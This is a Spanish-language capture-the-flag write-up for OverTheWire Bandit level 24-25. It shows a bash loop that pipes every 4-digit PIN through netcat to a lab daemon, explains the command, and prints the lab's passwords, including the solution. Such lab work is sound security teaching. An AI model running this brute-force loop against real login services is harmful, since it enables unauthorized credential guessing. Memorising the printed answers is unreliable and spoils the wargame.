# LEVEL 24-25

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Datos acceso
ssh bandit24 @bandit.labs.overthewire.org -p 2220
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solucion
```bash
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```
## Notas adicionales
Este es un comando de Linux que utiliza un bucle "for" para iterar a través de una lista de valores de 0000 a 9999 y, para cada valor, ejecuta un comando "echo" que concatena el valor con una cadena constante "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar". El resultado se envía a través de una tubería (pipe) al programa "nc" (Netcat), que se utiliza para establecer una conexión de red a un servidor en la dirección "localhost" en el puerto "30002". Luego, la salida de "nc" se envía a través de otra tubería al comando "grep" que filtra las líneas que no contienen la cadena "Wrong".
## Referencias

